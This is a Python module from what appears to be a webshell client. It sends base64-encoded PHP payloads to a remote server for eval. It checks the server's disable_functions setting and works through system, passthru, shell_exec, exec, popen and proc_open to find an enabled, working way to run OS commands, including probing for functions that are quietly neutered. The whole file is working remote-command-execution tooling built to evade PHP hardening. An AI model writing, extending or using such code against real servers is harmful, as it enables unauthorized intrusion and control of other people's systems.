"""Execute PHP code and OS commands through a :class:`Transport`.

Two responsibilities:

* **PHP code execution** — wrap the payload between two random sentinels,
  base64-encode the whole thing and ``eval(base64_decode(...))`` it on the
  server.  base64 is what makes this robust: arbitrary quotes, newlines and
  binary in the payload survive transport untouched, which is exactly the
  injection/quoting class of bug that plagued v1's naive string interpolation.

* **Command execution** — pick a command-execution function that is *not* in
  the target's ``disable_functions`` list and fall back through the rest.  v1
  detected disabled functions but then always called ``system()`` anyway; this
  closes that gap.
"""

from __future__ import annotations

import base64

from ..encoders import Encoder, base64_encode
from ..exceptions import ExecutionFailed, NoExecFunction, WebshellError
from ..utils.strings import random_token
from .transport import Transport

# Preference order: each entry maps a PHP function to a snippet that runs a
# base64-encoded command and echoes its combined stdout/stderr.
_EXEC_BUILDERS = {
    "system": lambda b64: f"system(base64_decode('{b64}'))",
    "passthru": lambda b64: f"passthru(base64_decode('{b64}'))",
    "shell_exec": lambda b64: f"echo shell_exec(base64_decode('{b64}'))",
    "exec": lambda b64: f"exec(base64_decode('{b64}'),$o);echo implode(chr(10),$o)",
    "popen": lambda b64: (
        f"$h=popen(base64_decode('{b64}'),'r');"
        "while(!feof($h)){echo fread($h,4096);}pclose($h)"
    ),
    "proc_open": lambda b64: (
        "$d=[1=>['pipe','w'],2=>['pipe','w']];"
        f"$p=proc_open(base64_decode('{b64}'),$d,$pp);"
        "echo stream_get_contents($pp[1]).stream_get_contents($pp[2]);"
        "proc_close($p)"
    ),
}


class Executor:
    def __init__(self, transport: Transport, encoder: Encoder | None = None):
        self.transport = transport
        self._encode = encoder or base64_encode
        self._disabled: set[str] | None = None
        self._exec_function: str | None = None

    @staticmethod
    def _b64(data: str) -> str:
        return base64.b64encode(data.encode()).decode()

    def run_php(self, code: str) -> str:
        """Run a snippet of PHP and return whatever it echoes.

        ``code`` is a sequence of PHP statements *without* a trailing
        semicolon (one is appended for you, matching v1 semantics).
        """
        token = random_token()
        code = code.strip().rstrip(";")
        wrapped = f"echo '{token}';{code};echo '{token}';"
        body = self.transport.send(self._encode(wrapped))
        parts = body.split(token)
        if len(parts) < 3:
            raise ExecutionFailed(
                "Sentinel not found in response — the payload likely errored out."
            )
        return parts[1]

    @property
    def disabled_functions(self) -> set[str]:
        if self._disabled is None:
            raw = self.run_php("echo ini_get('disable_functions')").strip()
            self._disabled = {f.strip() for f in raw.split(",") if f.strip()}
        return self._disabled

    def pick_exec_function(self) -> str:
        """Return the first command-exec function that isn't disabled."""
        if self._exec_function is not None:
            return self._exec_function
        for name in _EXEC_BUILDERS:
            if name not in self.disabled_functions:
                self._exec_function = name
                return name
        raise NoExecFunction(
            "Every known command-execution function is disabled: "
            + ", ".join(sorted(_EXEC_BUILDERS))
        )

    def _resolve_exec_function(self) -> str:
        """Pick a command-exec function that actually produces output.

        Probes each non-disabled candidate with a tiny ``echo`` and returns the
        first that echoes back — catching functions that are listed-enabled but
        silently neutered (suhosin/open_basedir). If none echo (inconclusive),
        falls back to the first non-disabled candidate.
        """
        if self._exec_function is not None:
            return self._exec_function
        candidates = [name for name in _EXEC_BUILDERS if name not in self.disabled_functions]
        if not candidates:
            raise NoExecFunction(
                "Every known command-execution function is disabled: "
                + ", ".join(sorted(_EXEC_BUILDERS))
            )
        token = random_token(8)
        probe = self._b64(f"echo {token}")
        for name in candidates:
            try:
                if token in self.run_php(_EXEC_BUILDERS[name](probe)):
                    self._exec_function = name
                    return name
            except WebshellError:
                continue
        self._exec_function = candidates[0]
        return self._exec_function

    def run_command(self, command: str) -> str:
        """Run an OS command (stderr merged into stdout) and return its output."""
        function = self._resolve_exec_function()
        b64 = self._b64(f"{command} 2>&1")
        return self.run_php(_EXEC_BUILDERS[function](b64))
